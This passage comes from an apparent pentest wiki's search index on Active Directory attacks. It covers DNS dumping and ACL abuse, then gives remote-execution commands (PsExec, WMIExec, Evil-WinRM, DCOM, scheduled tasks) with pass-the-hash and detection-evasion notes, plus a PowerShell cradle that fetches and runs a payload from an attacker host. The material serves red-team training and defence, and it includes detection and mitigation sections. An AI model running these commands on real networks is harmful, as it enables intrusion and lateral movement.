Mitigation","text":"","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.001","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#opsec/low-detection"]},{"location":"Active%20Directory/flat/diamond_ticket/#detection","title":"Detection","text":"<p>Diamond Tickets are more difficult to detect than Golden Tickets, but some strategies include:</p> <ul> <li>Look for discrepancies between the user account in the ticket and their typical group memberships</li> <li>Monitor for high-privilege actions from accounts that normally don't have such privileges</li> <li>Analyze Kerberos tickets for signs of tampering, such as unusual PAC modifications</li> <li>Track access patterns for sensitive resources to identify anomalous access</li> </ul>","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.001","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#opsec/low-detection"]},{"location":"Active%20Directory/flat/diamond_ticket/#mitigation","title":"Mitigation","text":"<ul> <li>Regularly rotate the KRBTGT account password (twice to invalidate all previous tickets)</li> <li>Implement robust monitoring for suspicious Kerberos ticket usage</li> <li>Deploy Advanced Threat Analytics or Microsoft Defender for Identity to detect suspicious Kerberos activity</li> <li>Use Protected Users security group for privileged accounts</li> <li>Implement the principle of least privilege and use time-based access where possible</li> <li>Deploy Privileged Access Workstations (PAWs) for administrative tasks</li> <li>Consider implementing a tiered administration model to limit the risk of credential theft</li> </ul>","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.001","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#opsec/low-detection"]},{"location":"Active%20Directory/flat/dns_dump/","title":"Dns dump","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1590","#stage/reconnaissance","#protocol/dns","#os/windows","#tool/adidnsdump","#tool/dig"]},{"location":"Active%20Directory/flat/dns_dump/#technique","title":"Technique","text":"<p>https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/ </p> <p>Some records may be \"hidden\" due to default permissions (e.g., computer DNS records without \"Everyone\" read rights), visible only as names in LDAP queries but not their contents. These can be resolved via DNS queries. Inspired by prior work on ADIDNS, this uses tools like adidnsdump to automate enumeration over LDAP and DNS.</p>","tags":["#type/technique","#tactic/TA0007","#technique/T1590","#stage/reconnaissance","#protocol/dns","#os/windows","#tool/adidnsdump","#tool/dig"]},{"location":"Active%20Directory/flat/dns_dump/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Valid AD domain account (even low-privilege). System State: Network access to a DC with AD-integrated DNS. Tools: adidnsdump </p>","tags":["#type/technique","#tactic/TA0007","#technique/T1590","#stage/reconnaissance","#protocol/dns","#os/windows","#tool/adidnsdump","#tool/dig"]},{"location":"Active%20Directory/flat/dns_dump/#execution","title":"Execution","text":"<p>Display available DNS zones</p> <pre><code>adidnsdump -u domain\\\\user --print-zones dc01.domain.local\n</code></pre> <p>This shows forest/domain zones (e.g., ignore stub/forward zones and query their actual zones).</p> <p>Dump &amp; list records in default zone (outputs to <code>records.csv</code>). Hidden records appear with \"?\" as type/IP is unknown:</p> <pre><code>adidnsdump -u domain\\\\user dc01.domain.local\n</code></pre> <p>Dump records in specific zone:</p> <pre><code>adidnsdump -u domain\\\\user --zone &lt;zone&gt; dc01.domain.local\n</code></pre> <p>Resolve hidden records by querying DNS for A/AAAA records (resolves \"?\" entries with actual IPs):</p> <pre><code>adidnsdump -u domain\\\\user dc01.domain.local -r\n</code></pre> <p>Prior tools like PowerShell scripts (e.g., from Mubix, 2013) or Python versions exist, but adidnsdump automates and enhances this.</p>","tags":["#type/technique","#tactic/TA0007","#technique/T1590","#stage/reconnaissance","#protocol/dns","#os/windows","#tool/adidnsdump","#tool/dig"]},{"location":"Active%20Directory/flat/dns_dump/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1590","#stage/reconnaissance","#protocol/dns","#os/windows","#tool/adidnsdump","#tool/dig"]},{"location":"Active%20Directory/flat/dns_dump/#detection","title":"Detection","text":"<ul> <li>Monitor LDAP queries listing DNS zone children or high-volume DNS requests.</li> <li>Audit DNS zone accesses; alert on anomalies like bulk queries from single user.</li> <li>Enable logging for unusual DNS queries (e.g., many A/AAAA lookups in short time).</li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1590","#stage/reconnaissance","#protocol/dns","#os/windows","#tool/adidnsdump","#tool/dig"]},{"location":"Active%20Directory/flat/dns_dump/#mitigation","title":"Mitigation","text":"<ul> <li>Do not rely on DNS secrecy for security (treat it as public).</li> <li>Remove \"List contents\" permission for \"Everyone\" and \"Pre-Windows 2000 Compatible Access\" on DNS zones (may break inheritance and cause issues; test thoroughly).</li> <li>Disable local user DNS record creation if not needed (though breaks AD functionality).</li> <li>Instead of blocking, monitor for high volumes of DNS/DNS-related LDAP queries and enable auditing on zone permissions.</li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1590","#stage/reconnaissance","#protocol/dns","#os/windows","#tool/adidnsdump","#tool/dig"]},{"location":"Active%20Directory/flat/domain_acls/","title":"Domain acls","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1134","#stage/lateral-movement","#os/windows","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/domain_acls/#technique","title":"Technique","text":"<p>Attackers leverage misconfigured or overly permissive ACLs to escalate privileges, move laterally, and ultimately gain control over the domain. This is often done by identifying an ACL that grants a low-privilege user control over a high-value object (like a Domain Admin account or a sensitive group) and then using that control to compromise the target.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1134","#stage/lateral-movement","#os/windows","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/domain_acls/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>Initial Access: The attacker needs to have a foothold in the network, typically as a standard, unprivileged domain user.</p> </li> <li> <p>Active Directory Enumeration: The attacker must use tools like BloodHound to enumerate the Active Directory topology, identify the relationships between users and groups, and pinpoint the specific dangerous ACLs that can be exploited. This involves collecting data on objects, their properties, and their ACLs.</p> </li> <li> <p>Tooling: The attacker requires tools to interact with Active Directory and modify ACLs. Common tools include PowerShell (with the Active Directory module), Python-based libraries (like <code>impacket</code>), and specialized tools like BloodyAD.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1134","#stage/lateral-movement","#os/windows","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/domain_acls/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1134","#stage/lateral-movement","#os/windows","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/domain_acls/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1134","#stage/lateral-movement","#os/windows","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/execution_methods/","title":"Execution Methods","text":"","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#technique","title":"Technique","text":"<p>Execution methods encompass various techniques for running commands or code on remote systems. These methods are essential for lateral movement, privilege escalation, and maintaining access in a network environment. Each method has different requirements, stealth characteristics, and detection possibilities.</p> <p>Attackers and penetration testers use these methods to: - Execute commands on remote systems - Deploy payloads or tools - Establish persistence mechanisms - Move laterally through a network - Escalate privileges</p>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Varies by method - some require administrative privileges, others work with user-level access.</p> <p>System State: Target system must be accessible via network and have the relevant services enabled.</p> <p>Information: Valid credentials or authentication mechanisms for the target system.</p>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#smb-execution-methods","title":"SMB Execution Methods","text":"","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#psexec","title":"PsExec","text":"<p>PsExec is a classic remote execution tool that uses the SMB protocol to execute commands on remote systems.</p>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#using-impackets-psexecpy","title":"Using Impacket's psexec.py","text":"<pre><code># Basic execution with username/password\nimpacket-psexec domain.local/username:password@targetIP\n\n# With NTLM hash (Pass the Hash)\nimpacket-psexec domain.local/username@targetIP -hashes :nthash\n\n# Execute specific command\nimpacket-psexec domain.local/username:password@targetIP \"whoami\"\n\n# Upload and execute binary\nimpacket-psexec domain.local/username:password@targetIP -c payload.exe\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#using-netexec","title":"Using NetExec","text":"<pre><code># Execute command on multiple hosts\nnxc smb 192.168.1.0/24 -u username -p password -x \"whoami\"\n\n# Execute with Pass the Hash\nnxc smb 192.168.1.0/24 -u username -H nthash -x \"whoami\"\n\n# Execute PowerShell command\nnxc smb 192.168.1.0/24 -u username -p password -X \"Get-Process\"\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#using-windows-native-psexec","title":"Using Windows Native PsExec","text":"<pre><code># Basic execution\nPsExec.exe \\\\targetIP -u username -p password cmd.exe\n\n# Execute specific command\nPsExec.exe \\\\targetIP -u username -p password -c \"whoami\"\n\n# Run as System\nPsExec.exe \\\\targetIP -s cmd.exe\n\n# Interactive session\nPsExec.exe \\\\targetIP -u username -p password -i cmd.exe\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#using-powershell-remoting-with-smb","title":"Using PowerShell Remoting with SMB","text":"<pre><code># Create SMB session and execute\n$sess = New-PSSession -ComputerName targetIP -Credential (Get-Credential)\nInvoke-Command -Session $sess -ScriptBlock {whoami}\n\n# Execute command without persistent session\nInvoke-Command -ComputerName targetIP -Credential (Get-Credential) -ScriptBlock {whoami}\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#opsec-considerations","title":"OPSEC Considerations","text":"<ul> <li>Creates a new service on the target system (PSEXESVC.exe)</li> <li>Leaves artifacts in the service registry</li> <li>Generates Event ID 7045 (new service installation) and 4697 (service installation)</li> <li>Network traffic is visible on SMB port (445)</li> </ul>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#smbexec","title":"SMBExec","text":"<p>SMBExec is similar to PsExec but executes commands through named pipes instead of creating a service.</p>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#using-impackets-smbexecpy","title":"Using Impacket's smbexec.py","text":"<pre><code># Basic execution\nimpacket-smbexec domain.local/username:password@targetIP\n\n# With NTLM hash\nimpacket-smbexec domain.local/username@targetIP -hashes :nthash\n\n# Execute specific command\nimpacket-smbexec domain.local/username:password@targetIP \"whoami\"\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#opsec-considerations_1","title":"OPSEC Considerations","text":"<ul> <li>Less noisy than PsExec (no service creation)</li> <li>Still generates SMB traffic</li> <li>Creates temporary files in ADMIN$ share</li> <li>May be detected by monitoring SMB file operations</li> </ul>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#wmi-execution-methods","title":"WMI Execution Methods","text":"","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#wmiexec","title":"WMIExec","text":"<p>WMIExec uses Windows Management Instrumentation to execute commands remotely.</p>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#using-impackets-wmiexecpy","title":"Using Impacket's wmiexec.py","text":"<pre><code># Basic execution\nimpacket-wmiexec domain.local/username:password@targetIP\n\n# With NTLM hash\nimpacket-wmiexec domain.local/username@targetIP -hashes :nthash\n\n# Execute specific command\nimpacket-wmiexec domain.local/username:password@targetIP \"whoami\"\n\n# Interactive shell\nimpacket-wmiexec domain.local/username:password@targetIP -shell\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#using-netexec_1","title":"Using NetExec","text":"<pre><code># Execute command via WMI\nnxc wmi 192.168.1.0/24 -u username -p password -x \"whoami\"\n\n# With Pass the Hash\nnxc wmi 192.168.1.0/24 -u username -H nthash -x \"whoami\"\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#manual-wmi-execution","title":"Manual WMI Execution","text":"<pre><code># Using PowerShell from Windows\nInvoke-WmiMethod -ComputerName targetIP -Class Win32_Process -Name Create -ArgumentList \"cmd.exe /c whoami\"\n\n# Using WMIC\nwmic /node:targetIP /user:username /password:password process call create \"cmd.exe /c whoami\"\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#opsec-considerations_2","title":"OPSEC Considerations","text":"<ul> <li>Uses WMI protocol (typically port 135)</li> <li>Less noisy than SMB methods</li> <li>May trigger Event ID 4688 (process creation)</li> <li>WMI activity can be monitored</li> <li>Some EDR solutions monitor WMI command execution</li> </ul>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#winrm-execution-methods","title":"WinRM Execution Methods","text":"","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#evil-winrm","title":"Evil-WinRM","text":"<p>Evil-WinRM is a WinRM shell for Windows that provides an interactive console.</p> <pre><code># Basic connection\nevil-winrm -i targetIP -u username -p password\n\n# With NTLM hash\nevil-winrm -i targetIP -u username -H nthash\n\n# With Kerberos ticket\nevil-winrm -i targetIP -u username -k\n\n# Upload and execute file\nupload payload.exe\n./payload.exe\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#using-netexec_2","title":"Using NetExec","text":"<pre><code># Execute command via WinRM\nnxc winrm 192.168.1.0/24 -u username -p password -x \"whoami\"\n\n# With Pass the Hash\nnxc winrm 192.168.1.0/24 -u username -H nthash -x \"whoami\"\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#manual-winrm-execution","title":"Manual WinRM Execution","text":"<pre><code># Using PowerShell from Windows\nInvoke-Command -ComputerName targetIP -Credential (Get-Credential) -ScriptBlock {whoami}\n\n# Using winrs command\nwinrs -r:targetIP -u:username -p:password \"whoami\"\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#opsec-considerations_3","title":"OPSEC Considerations","text":"<ul> <li>Requires WinRM to be enabled (not default on workstations)</li> <li>Uses HTTP/HTTPS (ports 5985/5986)</li> <li>Generates Event ID 4688 (process creation)</li> <li>WinRM connections can be monitored</li> <li>SSL/TLS encryption can hide command content</li> </ul>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#dcom-execution-methods","title":"DCOM Execution Methods","text":"","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#dcom-execution-via-excel","title":"DCOM Execution via Excel","text":"<pre><code># Create DCOM object\n$com = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\",\"targetIP\"))\n\n# Execute command\n$com.DisplayAlerts = $false\n$result = $com.ExecuteExcel4Macro(\"CALL(\"\"cmd.exe\"\",\"\"/c whoami\"\",\"\"C\"\")\")\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#dcom-execution-via-mmc","title":"DCOM Execution via MMC","text":"<pre><code># Create MMC application object\n$com = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"targetIP\"))\n\n# Execute command\n$com.Document.ActiveView.ExecuteShellCommand(\"cmd.exe\",$null,\"/c whoami\",\"7\")\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#opsec-considerations_4","title":"OPSEC Considerations","text":"<ul> <li>Uses DCOM protocol (typically port 135)</li> <li>Less commonly monitored than SMB/WMI</li> <li>May trigger antivirus/EDR alerts</li> <li>Requires DCOM to be enabled on target</li> </ul>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#scheduled-task-execution","title":"Scheduled Task Execution","text":"","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#using-netexec_3","title":"Using NetExec","text":"<pre><code># Create and execute scheduled task\nnxc smb 192.168.1.10 -u username -p password --at-exec \"whoami\"\n\n# With Pass the Hash\nnxc smb 192.168.1.10 -u username -H nthash --at-exec \"whoami\"\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#manual-scheduled-task-creation","title":"Manual Scheduled Task Creation","text":"<pre><code># Using PowerShell from Windows\nInvoke-Command -ComputerName targetIP -Credential (Get-Credential) -ScriptBlock {\n    schtasks /create /tn \"TaskName\" /tr \"cmd.exe /c whoami &gt; C:\\temp\\output.txt\" /sc once /st 00:00\n    schtasks /run /tn \"TaskName\"\n    schtasks /delete /tn \"TaskName\" /f\n}\n\n# Using schtasks directly\nschtasks /s targetIP /u username /p password /create /tn \"TaskName\" /tr \"cmd.exe /c whoami\" /sc once /st 00:00\nschtasks /s targetIP /u username /p password /run /tn \"TaskName\"\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#opsec-considerations_5","title":"OPSEC Considerations","text":"<ul> <li>Creates temporary scheduled task</li> <li>Generates Event ID 4698 (scheduled task creation)</li> <li>Task execution creates Event ID 4688 (process creation)</li> <li>Can be detected by monitoring task creation</li> <li>Less noisy than service creation</li> </ul>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#service-execution-methods","title":"Service Execution Methods","text":"","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#using-netexec_4","title":"Using NetExec","text":"<pre><code># Create and execute service\nnxc smb 192.168.1.10 -u username -p password --service-exec \"whoami\"\n\n# With Pass the Hash\nnxc smb 192.168.1.10 -u username -H nthash --service-exec \"whoami\"\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#manual-service-creation","title":"Manual Service Creation","text":"<pre><code># Using PowerShell from Windows\nInvoke-Command -ComputerName targetIP -Credential (Get-Credential) -ScriptBlock {\n    New-Service -Name \"ServiceName\" -BinaryPathName \"cmd.exe /c whoami\" -DisplayName \"DisplayName\"\n    Start-Service -Name \"ServiceName\"\n    Stop-Service -Name \"ServiceName\"\n    Remove-Service -Name \"ServiceName\"\n}\n\n# Using sc command\nsc \\\\targetIP create ServiceName binpath= \"cmd.exe /c whoami\"\nsc \\\\targetIP start ServiceName\nsc \\\\targetIP delete ServiceName\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#opsec-considerations_6","title":"OPSEC Considerations","text":"<ul> <li>Creates new service on target system</li> <li>Generates Event ID 7045 (new service installation)</li> <li>Service execution creates Event ID 4688 (process creation)</li> <li>Highly detectable by security solutions</li> <li>Leaves registry artifacts</li> </ul>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#remote-powershell-execution","title":"Remote PowerShell Execution","text":"","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#powershell-remoting","title":"PowerShell Remoting","text":"<pre><code># Basic remoting\nEnter-PSSession -ComputerName targetIP -Credential (Get-Credential)\n\n# Execute command\nInvoke-Command -ComputerName targetIP -Credential (Get-Credential) -ScriptBlock {whoami}\n\n# Execute script\nInvoke-Command -ComputerName targetIP -Credential (Get-Credential) -FilePath script.ps1\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#powershell-web-delivery","title":"PowerShell Web Delivery","text":"<pre><code># On attacker machine (setup web server)\npython -m http.server 80\n\n# On target machine\npowershell -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://attackerIP/payload.ps1')\"\n</code></pre>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#opsec-considerations_7","title":"OPSEC Considerations","text":"<ul> <li>Requires PowerShell remoting to be enabled</li> <li>Uses WinRM protocol (ports 5985/5986)</li> <li>Command logging may be enabled</li> <li>AMSI (Antimalware Scan Interface) may block malicious code</li> <li>Constrained Language Mode may restrict execution</li> </ul>","tags":["#type/technique","#tactic/TA0002","#tactic/TA0008","#technique/T1021","#technique/T1569","#stage/execution","#stage/lateral-movement","#os/windows","#protocol/smb","#protocol/wmi","#protocol/winrm","#tool/impacket","#tool/netexec","#tool/cobalt-strike","#tool/metasploit"]},{"location":"Active%20Directory/flat/execution_methods/#living-off-the-land-execution","title":"Living Off The Land 